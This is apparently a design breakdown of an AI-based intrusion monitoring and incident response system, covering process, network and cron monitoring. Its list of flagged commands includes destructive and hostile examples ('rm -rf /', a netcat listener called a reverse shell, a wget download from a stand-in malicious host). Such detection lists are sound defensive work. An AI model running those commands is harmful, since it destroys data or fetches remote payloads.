AI-Driven Cybersecurity Monitoring & Incident Response System (IRM) - Detailed Technical Breakdown

1. System Overview
AI/ML-based IRM (Incident Response Management) system is a real-time cybersecurity monitoring framework that collects, analyzes, and responds to threats across a Linux (Ubuntu) to Windows infrastructure. It replaces traditional rule-based SIEM (Security Information and Event Management) with behavioral anomaly detection, threat intelligence correlation, and automated response mechanisms.

Key Innovations:
âœ… AI/ML-Powered Anomaly Detection â€“ Uses Isolation Forest & One-Class SVM to detect deviations from normal behavior
âœ… False Positive Reduction â€“ Unlike signature-based IDS, it analyzes process behavior, network patterns, and command execution
âœ… Threat Intelligence Integration â€“ Correlates internal events with AbuseIPDB, VirusTotal, and OSINT feeds
âœ… Automated Incident Response â€“ Kills malicious processes, generates alerts, and provides forensic reports
âœ… Interactive Dashboard (Streamlit) â€“ Visualizes security data for real-time decision-making

2. System Architecture
2.1. Infrastructure Components
Component	Role	Technologies Used
Ubuntu VM (Client)	Data Collection	Python, psutil, systemd
Windows VM (Server)	Data Processing & AI Analysis	Python, SQLite, Scikit-learn

2.2. Data Flow
Ubuntu VM (Client-Side)

Collects process metrics (CPU, memory, commands)

Monitors network connections (TCP flags, ports, IPs)

Logs suspicious commands (e.g., rm -rf, chmod 777)

Tracks cron jobs (malicious persistence checks)

Sends data to Windows VM via TCP sockets

Windows VM (Server-Side)

Receives logs via Python socket server

Stores data in SQLite database (process_monitoring.db)

Runs AI/ML models (Isolation Forest, SVM) for anomaly detection

Generates real-time alerts & automated responses

Streamlit Dashboard

Displays process behavior, network threats, and incident reports

Allows manual process termination & threat intelligence lookups

Generates PDF/HTML reports for forensic analysis

3. Key Features & Implementation Details
3.1. Real-Time Process Monitoring
Data Collected:

PID, CPU%, MEM%, User, Command, Runtime

Parent-Child Process Relationships (Detects process injection)

Anomaly Detection:

Trains Isolation Forest on normal process behavior

Flags deviations (e.g., unexpected CPU spikes, hidden processes)

Automated Response:

Kills processes exceeding CPU/MEM thresholds

Whitelists critical system processes

3.2. Network Traffic Analysis
Captures:

Source/Destination IPs & Ports

TCP Flags (SYN, ACK, RST) to detect scans/DDoS

GeoIP Lookup (Identifies suspicious countries)

Threat Detection:

Port Scanning Detection (Multiple SYN requests)

C2 (Command & Control) Beaconing (Regular outbound connections)

Data Exfiltration (Unusual large data transfers)

3.3. Suspicious Command Detection
High-Risk Commands Flagged:

rm -rf / (Forced deletion)

chmod 777 (Permission escalation)

nc -lvp 4444 (Reverse shell)

wget http://malicious.com/script.sh (Malware download)

Scoring System:

0-100 Risk Score (Commands above 70 trigger alerts)

3.4. Cron Job Monitoring
Detects:

Unauthorized cron jobs (Persistence mechanisms)

Malicious scripts (e.g., cryptocurrency miners)

Visualization:

Timeline of cron executions

User-based filtering (Find jobs by root vs. normal users)

3.5. Threat Intelligence Integration
IP Reputation Checks:

AbuseIPDB (Reports malicious IPs)

VirusTotal (Checks for malware associations)

GreyNoise (Identifies scanners/bots)

Dashboard Features:

IP Threat Score (0-100)

Geolocation Map (Visualizes attack origins)

3.6. Automated Incident Response
Process Termination:

kill -9 [PID] for high-risk processes

Verification (Checks if process was successfully killed)

Alerting:

Email reports (PDF/HTML)

Streamlit dashboard alerts (Color-coded by severity)

4. AI/ML Implementation
4.1. Anomaly Detection Models
Model	Use Case	Training Data
Isolation Forest	Detects unusual process behavior	CPU%, MEM%, Runtime
One-Class SVM	Identifies rare command executions	Command frequency, user patterns

6. Future Enhancements
ðŸ”¹ Integrate with SIEM (Splunk, ELK Stack)
ðŸ”¹ Deploy on cloud (AWS/GCP) for scalability
ðŸ”¹ Add YARA rules for malware detection
ðŸ”¹ Implement MITRE ATT&CK mapping

Conclusion
Your AI-driven IRM system successfully replaces traditional rule-based monitoring with behavioral anomaly detection, automated response, and threat intelligence. It provides:
âœ” Lower false positives than signature-based tools
âœ” Real-time attack detection (Process hijacking, C2, data exfiltration)
âœ” Automated incident response (Process killing, alerting)
âœ” Forensic-ready reports (PDF/HTML + email alerts)

This framework is production-ready and can be extended for enterprise SOC (Security Operations Center) deployment. ðŸš€
